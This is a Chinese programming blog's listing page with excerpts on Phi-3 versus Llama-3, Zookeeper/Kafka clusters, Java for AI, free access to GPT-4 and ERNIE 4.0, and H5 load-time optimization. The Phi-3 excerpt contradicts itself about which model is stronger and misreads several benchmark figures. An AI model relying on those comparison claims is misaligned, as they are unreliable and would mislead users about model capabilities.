虽然Llama-3在某些特定任务上可能仍然表现出色，但从整体性能、多语言支持、以及在移动设备上的可用性来看，Phi-3系列模型展现出了能够击败Llama-3的能力。因此，基于我搜索到的资料，可以得出结论，Phi-3确实能够在多个方面超越Llama-3。
Phi-3系列模型在哪些具体任务上超越了Llama-3？ Phi-3系列模型在多个具体任务上超越了Llama-3。首先，Phi-3系列模型在语言理解和推理任务上展现出了优秀的性能，尽管参数数量较少，但其性能在某些基准测试中甚至超过了参数数量更多的模型[14]。特别是，Phi-3-Mini版本在MMLU语言理解基准测试中达到了69%的得分，在MT基准测试中得分为8.这些成绩表明，Phi-3系列模型在处理语言理解和推理任务方面具有较高的效率和准确性。
此外，Phi-3系列模型支持多语言，并且使用了tiktoken分词器以及增加了10%多语种数据，这使得Phi-3系列模型在多语言处理任务上也表现出色[15]。这一点对于需要处理多种语言内容的应用场景尤为重要，能够提供更加灵活和广泛的语言处理能力。
同时，其对多语言的支持和优化也使其在多语言处理任务上超越了Llama-3[15]。
Llama-3与Phi-3系列模型在性能上的比较有哪些最新的研究或数据支持？ Llama-3与Phi-3系列模型在性能上的比较，根据最新的研究或数据支持，可以从以下几个方面进行分析：
参数规模和训练数据：Llama-3模型发布了8B和70B参数的版本，而Phi-3系列模型则包括mini（38亿参数）、small（70亿参数）和medium（140亿参数）三个版本[24][26]。这表明Llama-3在参数规模上更为广泛，覆盖了从小型到大型的不同应用场景。性能提升：Llama-3通过扩大词汇量、更长的上下文长度和先进的训练技术来增强大型语言模型技术，设定了新标准，挑战行业顶级竞争对手[25]。相比之下，Phi-3系列模型虽然也展示了出色的性能，特别是在基准跑分性能上超出Mixtral 8x7B和GPT-3.5[26]，但具体的性能提升细节较少提及。此外，英特尔至强6处理器针对Meta Llama 3模型的推理性能测试显示，Llama-3比Llama-2快1.04倍[29]。这些改进表明Llama-3在处理速度和效率方面进行了显著优化。多语言支持和数据清洗：Llama-3的预训练数据集比Llama-2使用的数据集大7倍，并且包含4倍多的代码，超过5%的预训练数据集由30多种语言的高质量非英语数据组成[30]。这种多语言支持和严格的数据清洗方法可能为Llama-3提供了更广泛的应用场景和更高的数据质量。 Llama-3与Phi-3系列模型在性能上的比较显示，Llama-3在参数规模、性能提升、应用和效率以及多语言支持和数据清洗方面具有明显优势。然而，Phi-3系列模型在特定场景下的性能表现也不容忽视，尤其是在基准跑分性能上的出色表现[26]。因此，两者各有千秋，适用于不同的应用场景和需求。
Phi-3系列模型如何优化以支持多语言和兼容性，具体实现方式是什么？ Phi-3系列模型为了支持多语言和兼容性，采取了以下具体实现方式：
多语言支持：Phi-3-Small模型通过使用tiktoken分词器来改进多语言分词，这意味着它能够更好地处理不同语言的文本数据。这种优化使得Phi-3-Small模型在处理多语言文本时更加高效和准确[35]。兼容性：Phi-3系列模型采用了模块化的前端、无服务器架构，并提供了REST API和Websocket接口。这种设计不仅提高了模型的灵活性，也增强了其与不同平台和服务的兼容性。用户可以通过这些接口轻松地将Phi-3模型集成到各种应用场景中，无论是云端还是边缘计算环境[36]。性能优化：尽管Phi-3系列模型在多语言支持和兼容性方面进行了优化，但它们仍然保持了高性能的特点。例如，Phi-3-Mini是一个拥有38亿参数的语言模型，经过3.3万亿token的训练，其整体性能在学术基准和内部测试上成绩优异。这表明Phi-3系列模型在保证多语言支持和兼容性的同时，也没有牺牲其推理能力和处理速度[37]。 Phi-3系列模型通过采用先进的分词技术、提供灵活的接口以及保持高性能的设计，有效地支持了多语言和兼容性需求。这些优化措施使得Phi-3系列模型能够在多种环境下高效运行，满足不同用户的需求。
在移动设备上的运行效率和用户体验方面，Phi-3系列模型相比Llama-3有哪些改进？ Phi-3系列模型相比Llama-3在移动设备上的运行效率和用户体验方面有以下改进：
运行效率：Phi-3系列模型是专为小参数设计的，这意味着它们在保持高性能的同时，参数数量较少。Phi-3 Mini可以测量38亿个参数，其训练数据集比GPT-4等大型语言模型要小[42]。这表明Phi-3系列模型能够在资源有限的移动设备上高效运行，而不需要像Llama 3那样依赖强大的硬件支持。Llama 3每秒输出800个token，需要较慢的生成速度以保证内容的可读性和对任务流程的理解[40]，这可能意味着在移动设备上运行时，其效率不如Phi-3系列模型。用户体验：Phi-3系列模型的设计考虑到了移动设备的使用场景，使其能够在本地直接运行，无需依赖云服务或外部网络连接[43]。这种设计显著提升了用户体验，因为用户可以享受到即时反馈和隐私保护的优势。相比之下，Llama 3虽然在多任务语言理解、复杂阅读理解等方面取得了巨大进步[38]，但其较高的硬件要求和对网络的依赖可能会限制其在移动设备上的用户体验。 Phi-3系列模型通过其小参数设计和对移动设备友好性的优化，在移动设备上的运行效率和用户体验方面相比Llama-3有了显著的改进。
关于Phi-3和Llama-3的最新基准测试结果是什么？ 关于Phi-3和Llama-3的最新基准测试结果，目前没有直接提及Phi-3的信息。然而，对于Llama-3，有多个来源提供了详细的性能评估。
Llama 3在关键基准测试中表现优异，尤其是在编程等任务上优于同类竞争模型。Meta声称Llama 3在MMLU、HumanEval和GSM-8K上的表现超越了Gemini 1.5 Pro[44]。此外，Llama 3的8B和70B参数版本在预训练语言模型的应用中取得了令人印象深刻的结果，这些模型被广泛用于文本生成、翻译、摘要、查询回答等任务[49]。Llama 3还通过改进tokenizer提高了token化效率，并添加了组查询关注（GQA）功能到8B版本中[46]。
然而，随着更强模型如Claude 3、Llama 3甚至GPT-5的发布，业界对更难、更有区分度的基准测试的需求增加。LMSYS推出的下一代基准测试Arena-Hard引起了广泛关注，这个新测试基准显示Llama 3的两个指令微调版本在Arena-Hard上的得分与之前大家分数相近的MT Bench相比，区分度从22.6%提升到87.4%，这表明Llama 3在新的挑战面前遇到了一些困难[50][51]。
关于Llama 3的最新基准测试结果显示其在多个关键基准测试中表现出色，尤其是在编程等任务上。同时，面对新的挑战和更难的基准测试，Llama 3也展现了一定的适应性和潜力。但是，目前没有关于Phi-3的具体信息。
欢迎大家微信关注我，可与AI自由对话（终身免费）：
参考资料 1. Phi-3 - 微软最新推出的新一代小模型系列 - AI工具集 [2024-04-24]
2. "小而精"，微软发布Phi-3，3.8B 性能比肩Llama-3-8B - 知乎专栏 [2024-04-24]
3. 人人可拥有GPT4，比得上GPT4的开源Llama3 原创 - CSDN博客 [2024-04-24]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98b901bcc3cb8ef6da87a1d990b80204/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9ba8c1032aaea84ff8cecaa1f663737/" rel="bookmark">
			深入探索：Zookeeper&#43;消息队列（kafka）集群
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一、Zookeeper概述
1、Zookeeper概念
2、Zookeeper 特点
3、Zookeeper工作机制
4、Zookeeper 选举机制
4.1 第一次启动选举机制
4.2 非第一次启动选举机制
5、Zookeeper 数据结构
6、Zookeeper 应用场景
二、部署 Zookeeper 集群
1、环境部署
2、安装 zookeeper 软件
3、设置主配置文件
4、创建数据目录和日志目录
5、创建myid文件
6、配置 Zookeeper 启动脚本并设置开机自启
7、分别启动 Zookeeper
三、消息队列（Message Queue）概述
1、消息队列的概念
2、为什么使用消息队列
3、使用消息队列的好处
4、消息队列的异步处理机制
5、消息队列的两种模式
5.1 点对点模式
5.2 发布/订阅模式
6、常见的消息队列系统
四、消息队列系统-Kafka
1、Kafka的概念
2、Kafka的特性
3、Kafka系统架构
3.1 系统架构的核心组件和概念
3.2 Kafka工作流程
4、kafka的follower如何与leader同步数据
5、Kafka分区的原因
6、Kafka文件存储机制
7、数据可靠性保证
8、数据一致性问题
9、ack 应答机制
五、部署 kafka 集群
1、环境部署
2、安装 kafka 软件
3、修改主配置文件
4、修改环境变量
5、配置 Zookeeper 启动脚本并设置开机自启
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9ba8c1032aaea84ff8cecaa1f663737/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/004eee71b969ecaac75dc22748ebddff/" rel="bookmark">
			JAVA与人工智能：开发未来的AI
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java人工智能的发展 随着人工智能技术的不断发展，越来越多的开发者开始关注Java在人工智能领域中的应用。作为一门广泛应用于企业级应用开发的编程语言，Java在人工智能领域也有着广泛的应用。本文将从Java基础知识回顾开始介绍Java与人工智能的关系，并深入探讨Java在人工智能中的应用及其未来前景。
Java基础知识回顾 Java是由Sun Microsystems（已被Oracle收购）于1995年推出的一种跨平台编程语言。它具有面向对象、可移植、高效和安全等特性，成为了广泛应用于企业级应用开发的编程语言之一。
Java语言特性概述： 简单易学：Java摒弃了C++中复杂的特性，如指针和多重继承等，简化了语法，使得Java程序变得更加易读、易写，降低了开发成本。
面向对象：Java采用面向对象编程思想，把数据和行为封装到类中，通过实例化类来创建对象，提高了代码的复用性和可维护性。
可移植性：Java代码编译后生成的是字节码而非机器码，这使得Java程序可以在任何兼容Java虚拟机（JVM）的平台上运行，实现了“一次编写，到处运行”的理念。
高效性：Java采用了垃圾回收机制，自动管理内存，减少了内存泄漏和指针错误，提高了程序的稳定性和安全性。
安全性：Java提供了一套安全机制，包括类加载、字节码校验、安全管理等，保证了Java程序的安全性。
面向对象编程思想：
在Java中，一切皆为对象。对象是类的实例，类是具有相同属性和行为的对象的模板。Java通过类封装数据和行为，提高了代码的复用性和可维护性。
常用类库和开发工具介绍： Java标准库（Java SE）提供了大量的类库，包括基本类型、集合框架、I/O流、网络编程等方面。除此之外，还有许多第三方开源类库如Apache Commons、Google Guava等，可以扩展Java的功能。
Java开发工具主要有Eclipse、IntelliJ IDEA、NetBeans等。它们提供了丰富的编辑、调试和测试功能，帮助开发者更高效地开发Java应用程序。
人工智能入门 人工智能（Artificial Intelligence，AI）是一种利用计算机技术模拟人类智能的研究领域。它涉及到多个学科领域，包括数学、统计学、计算机科学、语言学等。常见的人工智能算法包括机器学习、深度学习、自然语言处理等。
人工智能概述： 人工智能是一种复杂的系统，其最终目标是创造出具有人类智能水平的机器。在实际应用中，人工智能通常包括以下几个方面：
专家系统：通过规则引擎和知识库来推断和决策。
机器学习：机器学习是指让计算机通过自动分析数据，从中发现有用的模式和规律，并利用这些规律来预测和决策。常见的机器学习算法包括线性回归、决策树、支持向量机等。
深度学习：深度学习是一种机器学习技术，其基本原理是构建多层神经网络，通过反向传播算法来不断调整权重和偏置，最终实现对数据的分类和识别。深度学习在图像识别、语音识别和自然语言处理等领域取得了很大的进展。
自然语言处理： 自然语言处理是指将人类语言转换成计算机可以理解和操作的形式。它涉及到文本分析、语言模型、命名实体识别等方面。自然语言处理在智能客服、聊天机器人等领域具有广泛应用。
Java在人工智能中的应用 Java作为一种高效、跨平台的编程语言，在人工智能领域中也有着广泛的应用。下面我们将详细介绍Java在数据处理、机器学习和深度学习等方面的应用。
Java在数据处理中的应用： 数据处理是人工智能领域中重要的基础，而Java在这方面有着广泛的应用。Java提供了许多类库和开发工具，例如Hadoop、Spark、Flink等，可以实现大规模数据处理和分布式计算。此外， Java还可以通过各种API实现数据可视化和图像处理功能。
Hadoop是由Apache基金会开发的一套分布式文件系统和处理框架，可以有效地管理海量数据。Java语言是Hadoop框架的核心编程语言，也是Hadoop应用程序的首选语言之一。Java开发者可以使用Hadoop API来进行数据存储、查询、分析和处理。
Spark是一个快速、通用的大数据处理引擎，支持Scala、Python和Java等多种编程语言，并且提供了丰富的类库和API。Java开发者可以利用Spark来进行数据挖掘、机器学习和图形处理等任务。
Flink是一个高性能、低延迟的流式处理引擎，支持批处理和流处理。Java是Flink的核心编程语言，可以用于实现复杂的数据处理和分析任务。
Java在机器学习中的应用： 除了数据处理以外，Java在机器学习领域同样有着广泛的应用。Java作为一种高效、稳定的编程语言，非常适合用于大规模数据处理和复杂算法实现方面。
Apache Mahout是一个开源的机器学习库，旨在帮助Java开发者快速构建智能应用程序。Mahout提供了许多经典的机器学习算法，包括聚类、分类、推荐系统等。Java开发者可以利用Mahout来进行数据挖掘和预测分析。
Weka是一款流行的机器学习工具，也是基于Java语言实现的。Weka提供了丰富的机器学习算法实现，并且支持可视化界面来帮助用户进行数据分析和实验设计。
Java在深度学习中的应用： 深度学习是人工智能领域的热门话题之前几年，深度学习技术的快速发展使得它在图像识别、语音识别等领域取得了重大突破。而Java作为一种高效、稳定的编程语言，在深度学习领域也有着广泛的应用。
Deeplearning4j是由Skymind公司开发的一个基于Java的深度学习框架，支持分布式计算和GPU加速。它提供了丰富的神经网络模型和算法，并且可以集成其他Java类库和工具，例如Hadoop和Spark等。Java开发者可以通过使用Deeplearning4j来构建图像识别、文本分类和机器翻译等深度学习应用程序。
DL4J-Zoo是Deeplearning4j的一个子项目，其中包括了很多预训练的深度学习模型，如卷积神经网络（CNN）、循环神经网络（RNN）等。这些模型可以直接导入到Java程序中进行使用，提高了深度学习模型的开发效率和性能。
TensorFlow是Google开发的一个强大的深度学习框架，支持Python、C++和Java等多种编程语言。Java开发者可以通过TensorFlow Java API来使用TensorFlow，实现深度学习模型的训练和预测等任务。
开发一个实际的人工智能应用 在了解了Java在人工智能中的应用后，我们可以尝试开发一个实际的人工智能应用。下面将介绍如何设计自己的人工智能项目，并通过Java和相关库进行开发。
设计自己的人工智能项目： 首先需要确定自己的人工智能项目的类型，可以是图像识别、文本分类或者语音识别等。然后需要明确数据来源，收集并标注所需数据。最后需要选择合适的算法模型进行训练和测试，优化性能。
使用Java和相关库进行开发： 根据项目类型和算法模型的选择，可以选择相应的Java类库和工具进行开发和实现。例如使用Deeplearning4j进行图像识别，或者使用Weka进行文本分类等。
模型测试，部署和优化： 在完成开发后，需要对模型进行测试并进行优化，以提高准确率和性能。同时还需要考虑模型的部署方式和应用场景，选择合适的硬件和软件环境进行部署。
Java与人工智能的未来 Java作为一种高效、跨平台的编程语言，在人工智能领域中有着广泛的应用前景。随着深度学习和自然语言处理等领域的不断发展，Java在机器学习、模型训练和数据处理等方面仍将扮演重要角色。
除此之外，Java还可以在新兴技术如自动驾驶、机器人等领域发挥作用。例如，在自动驾驶车辆中，Java可以用于控制系统和感知模块的开发；在机器人中，Java可以用于图像识别和运动控制等方面。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25403f9ceaafca58a57dcb0d9767f969/" rel="bookmark">
			探索人工智能的边界：GPT 4.0与文心一言 4.0免费使用体验全揭秘！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		探索人工智能的边界：GPT与文心一言免费试用体验全揭秘！ 前言免费使用文心一言4.0的方法官方入口进入存在的问题免费使用文心一言4.0的方法 免费使用GPT4.0的方法官方入口进入存在的问题免费使用GPT4.0的方法 前言 未来已来，人工智能已经可以帮助人们完成许多工作了，不少工作机会正在被人工智能逐渐替代，我们应该积极拥抱人工智能，今天就为大家带来当下国内外最先进的两个人工智能体的使用方法。
免费使用文心一言4.0的方法 官方入口进入存在的问题 通过文心一言的官方入口，只能使用文心一言3.5，想要使用文心一言4.0，需要开通会员，如下图所示：
免费使用文心一言4.0的方法 第一步：通过文心智能体验平台进入，网址如下：
https://agents.baidu.com/
进入之后，会看到如下界面：
第二步：点击立即进入，之后可见到如下界面
通过以上界面，可以看到许多我们可以使用的AI应用。但是这些应用不一定使用的是文心一言4.0核心。
第三步：“点击创建智能体”
第四步：点击零代码下的“立即创建”按钮
第五步：如下，进行智能体设置，当然也可以点击跳过，直接进行对话。
第六步：使用文心一言4.0，界面如下：
通过上图可以看到，我们已经能够正常使用文心一言4.0模型了。
免费使用GPT4.0的方法 官方入口进入存在的问题 同样，通过官方入口进入OpenAI，只能使用GPT3.5，如下图所示：
免费使用GPT4.0的方法 第一步：进入如下网址：
https://www.coze.com
界面如下，输入GPT进行收索
收索得到如下界面：
第二步：点击ChatGPT 4（Turbo），如果需要注册，根据提示进行注册，如果有google账号，可以利用google账户登录，就可以正常使用了。如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30113d3f7503079d4ce09bfd1dfcc05d/" rel="bookmark">
			前端首屏优化 | 借助客户端能力提升 H5 首屏的 8 个手段
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前写了一篇文章 《面试官上来就问：如何实现 H5 秒开？》，聊到了如何根据分类思维来梳理性能优化方案，反响还不错。
于是，我计划输出「前端首屏优化」专栏系列，从不同角度聊聊首屏优化实践，包括且不限于防劣化、工程体系、端能力等，欢迎关注 ✨✨。
作为专栏的第一篇，本文将从客户端角度，聊聊如何借助端能力优化前端首屏加载速度。除了方案介绍，本文还会提供数据收益、注意事项、开发成本等，以帮助大家更好的评估实现优先级，选择合适业务的方案。
本文主要是经验和原理之谈，不涉及客户端代码实现，比较适合想开拓视野的前端领域读者。
上图为通用的页面加载链路， 利用分类思维，对该流程进行简化、前置、拆分，得到如下客户端优化方案：
以上是 8 种常见的优化手段，实际项目中不一定都用上，并且优化手段也不止这些。
下面，我将进一步介绍这些方案。
与浏览器不同，App 打开 H5 页面的第一步并不是建立页面请求连接，而是初始化 Webview。
初始化 Webview 包括创建 Webview 实例，对于 App 冷启后的首次 Webview 初始化，还需要初始化浏览器内核。
因此，对于冷启或者全新安装的 App ，首次初始化 Webview 耗时相对较长，大概在数百 ms ；而二次打开就较快了，大概在数十 ms。
首次打开 Webview 耗时二次打开 Webview 耗时数百ms数十ms PS：具体数据与用户设备有关，经验值大致如上
容器启动优化的目标就是将初始化的这段时间省去，常用的解决方案是容器预建。
1️⃣ 容器预建 提前创建 Webview 容器，当需要加载页面的时候就可以直接使用，省去容器初始化时间（数十ms~数百ms）。
提前创建 Webview 容器，需要注意创建时机和创建个数。
创建时机：闲时创建。Webview 只能在主线程创建，但又不能阻碍主流程，因此需要在 IdleHandler 时机处理。与前端的 requestIdleCallback 、React Scheduler 概念相似。
创建个数：一般仅创建一个，当预创建的 Webview 容器被使用后，再重新预创建（考虑内存状态）。
此外，结合线程池的概念，可以对容器进行复用，页面销毁并不回收 Webview 容器，而是继续常驻（考虑内存状态）。
容器启动后，客户端将发起页面请求并加载资源。
根据页面的复杂度，这一阶段耗时大概在几十毫秒到数秒之间。
常用的优化手段包括：
网络建连优化：优化网络连接，让解析更快、链路更短
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/30113d3f7503079d4ce09bfd1dfcc05d/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/398/">«</a>
	<span class="pagination__item pagination__item--current">399/621</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/400/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>